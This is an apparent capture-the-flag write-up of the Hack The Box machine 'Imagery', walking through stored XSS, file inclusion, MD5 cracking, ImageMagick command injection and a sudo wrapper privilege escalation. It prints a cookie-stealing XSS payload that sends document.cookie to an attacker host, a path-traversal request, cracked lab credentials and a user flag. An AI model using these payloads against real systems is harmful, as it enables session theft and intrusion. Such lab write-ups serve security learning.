# 💻 HTB: Imagery Writeup

This document details the exploitation path for the Hack The Box machine **Imagery** (Medium difficulty), covering Initial Access via **Remote Code Execution (RCE)** and Privilege Escalation (PrivEsc) via a **Kernel Exploit Wrapper**.

## Summary of Vulnerabilities Exploited

1.  **Broken Access Control:** Exploited a Stored XSS to steal a privileged session cookie.
2.  **Insecure Credential Storage:** Found MD5 hashes in a database file (`db.json`) and cracked the password for the Test User and the system user `mark`.
3.  **Command Injection (RCE):** Abused an ImageMagick execution flaw (`/apply_visual_transform`) to gain an initial shell.
4.  **Privilege Escalation:** Exploited a misconfigured `sudo` policy on a custom binary (`charcol`) that runs a known **Linux Kernel Vulnerability (CVE-2025-21700)** payload as root.

---

## Initial Access: RCE via ImageMagick Injection (User: web)

The web service on **Port 8000** (Werkzeug httpd/Flask) was the primary entry point. The application restricted file uploads and image features to privileged users.

### 1. Information Gathering & Discovery

* **Nmap Scan:** Discovered **Port 22 (SSH)** and **Port 8000 (HTTP)**.
* **Web Enumeration:** Intercepting traffic revealed API endpoints like `/auth_status`, `/upload_image`, and `/apply_visual_transform`.
* **Vulnerability Pivot:** The **`/admin/get_system_log`** endpoint was identified as a potential **Local File Inclusion (LFI)** vulnerability. Attempts to access it failed due to a `403 FORBIDDEN` error.

### 2. Authorization Bypass (XSS $\rightarrow$ Admin Cookie)

Since direct LFI was blocked by authorization, the goal was to steal a valid, privileged cookie.

* **Attack:** A **Stored Cross-Site Scripting (XSS)** attack was launched against the `/report_bug` endpoint.
* **Payload (Injected into `bugDetails`):**
    ```html
    <img src=x onerror=fetch("http://[YOUR_KALI_IP]:8888/?cookie="+document.cookie)>
    ```
* **Execution:** A Python process (the admin bot) viewed the bug report, causing the script to execute and send the privileged cookie to the Netcat listener.
<img width="1577" height="511" alt="Imagery_XSS_BurpSUite" src="https://github.com/user-attachments/assets/b3faafb9-d08a-4fd4-a2e1-69d2b9cfa31f" />
<img width="933" height="253" alt="Imagery-NC cookie gotten" src="https://github.com/user-attachments/assets/bb27f154-c007-4912-bb7d-07aa3ed61a19" />

### 3. Data Extraction (LFI $\rightarrow$ Passwords)
<img width="721" height="351" alt="ImageryGetSytemInfoFunction" src="https://github.com/user-attachments/assets/adbe6af4-34ac-4ede-be36-f7bdc4aeb657" />

Using the newly cap<img width="1694" height="872" alt="Imagery LFI Exploited" src="https://github.com/user-attachments/assets/2febfdb5-8092-4eba-938f-8995f09379a9" />
tured privileged cookie (which bypassed the `403 FORBIDDEN` check), the LFI vulnerability was exploited to read sensitive files:

* **LFI Success:** The payload successfully read the `/etc/passwd` file and the application path from `/proc/self/cmdline` (at `/home/web/web/`).<img width="1540" height="447" alt="Imagery-LFI2" src="https://github.com/user-attachments/assets/61bba9fc-17bb-4855-9077-2a2e0584a8e7" />

* **Final Data Source:** The application's database file was located and downloaded:
    ```http
    GET /admin/get_system_log?log_identifier=../../../../../../../home/web/web/db.json
    ```
    <img width="1617" height="944" alt="Imagery db json found in config py" src="https://github.com/user-attachments/assets/3052a8cd-a229-4c05-a5ab-7b297e7d2177" />

* **Credentials Found:** The `db.json` file revealed weakly encrypted (MD5) user passwords:
    | User | Hash | Plaintext Password | Role |
    | :--- | :--- | :--- | :--- |
    | `testuser@imagery.htb` | `2c65c8d7bfbca32a3ed42596192384f6` | **`iambatman`** | **RCE Gatekeeper** |
    | `admin@imagery.htb` | `5d9c1d507a3f76af1e5c97a3ad1eaa31` | `strongsandofbeach` | Full Admin |
    | `mark@imagery.htb` | `01c3d2e5bdaf6134cec0a367cf53e535` | **`supersmash`** | **System User** |

### 4. RCE Execution (ImageMagick)
<img width="682" height="481" alt="ApplyVisual Transform" src="https://github.com/user-attachments/assets/e9465f8c-8bf8-480c-b467-df1f5da224ad" />

The application restricted the `/apply_visual_transform` RCE endpoint to users with the `isTestuser: true` flag.
<img width="878" height="445" alt="TestUserCracked" src="https://github.com/user-attachments/assets/70b9aee5-6c64-4ba6-9fd4-ffb35e41cce6" />

* **Final Login:** Logged in as **`testuser@imagery.htb` / `iambatman`** to obtain the correct session cookie.
* **Injection:** The RCE was executed by injecting a shell command into the `height` parameter, which is passed to the ImageMagick (`/usr/bin/convert`) command line:
<img width="687" height="537" alt="Imagery_revSEHELRequest" src="https://github.com/user-attachments/assets/8d8aa51d-e430-4c0d-b44d-7202b983ae4a" />

* **Result:** A reverse shell was established as the low-privileged **`web`** user.

---

## Privilege Escalation: Root via Kernel Exploit Wrapper (User: root)

### 1. User Flag and Password Cracking

* **Final Password Crack (User: mark):** The password for system user `mark` was cracked from the `db.json` hash using Hashcat.

    | Target Hash | Plaintext Password | Tool/Mode |
    | :--- | :--- | :--- |
    | `01c3d2e5bdaf6134cec0a367cf53e535` | **`supersmash`** | `hashcat -m 0 rockyou.txt` |
  
<img width="633" height="408" alt="Imagery MArk Passwoe" src="https://github.com/user-attachments/assets/2114c436-db42-44b0-9d97-48de5a251137" />


* **SSH/SU:** Used the cracked password (`supersmash`) to switch user to `mark` and gain access to the user flag (`b074155730ad4e1f899f3afa9f583ec1`).
    ```bash
    su mark
    # Password: supersmash
    mark@Imagery:~$ cat user.txt 
    ```
### 2. Exploiting the Custom Root Wrapper (`charcol`)

The final escalation requires running a kernel exploit (`tc qdisc` commands) that is permission-blocked. The developer's intended solution was the custom wrapper **`charcol`** running as **root**.

* **Root Exploit Command:**
    The `mark` user was authorized to run `/usr/local/bin/charcol shell` as root without a password. This command executes a Python script that contains the core exploit payload.

    ```bash
    # Execute the custom wrapper as root
    sudo /usr/local/bin/charcol shell
    ```
* **Result:** The kernel exploit sequence **(CVE-2025-21700 UAF)** was triggered by the root-executed script, dropping a **root shell**.

### 3. Final Flag Capture
<img width="941" height="354" alt="THeFinalFlag" src="https://github.com/user-attachments/assets/f9930c03-da0c-4066-8e69-82128d719d80" />

```bash
root@Imagery:/# cat /root/root.txt
[ROOT_FLAG_HERE]
